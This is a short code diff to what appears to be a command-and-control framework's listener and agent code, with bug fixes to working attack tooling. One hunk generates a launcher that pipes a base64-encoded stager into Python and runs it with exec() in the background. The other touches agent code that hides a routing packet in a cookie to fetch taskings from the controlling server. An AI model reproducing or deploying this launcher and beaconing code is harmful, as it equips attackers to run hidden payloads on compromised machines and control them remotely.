@@ -514,8 +514,10 @@ class Listener(object):
                 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (
-                        launchEncoded.decode('UTF-8'))
+                    if isinstance(launchEncoded, bytes):
+                        launchEncoded = launchEncoded.decode('UTF-8')
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python3 &" % (
+                        launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -862,8 +864,7 @@ def send_message(packets=None):
             
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
-        print('getting tasking')
+        #   meta TASKING_REQUEST = 4     
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
         b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
         headers['Cookie'] = \"""" + self.session_cookie + """session=%s" % (b64routingPacket)
